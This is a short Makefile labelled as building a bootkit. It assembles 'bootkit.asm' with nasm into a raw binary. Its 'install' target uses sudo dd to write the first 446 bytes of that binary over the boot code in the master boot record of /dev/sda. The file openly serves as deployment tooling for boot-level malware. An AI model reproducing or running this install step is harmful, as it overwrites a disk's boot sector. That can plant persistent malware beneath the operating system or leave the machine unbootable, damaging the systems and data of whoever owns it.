# Bootkit Makefile
ASM = nasm
ASMFLAGS = -f bin -O3 -Wall
TARGET = bootkit.bin

all: $(TARGET)

$(TARGET): bootkit.asm
	$(ASM) $(ASMFLAGS) -o $@ $<

clean:
	rm -f $(TARGET)

install: $(TARGET)
	sudo dd if=$(TARGET) of=/dev/sda bs=446 count=1 conv=notrunc
	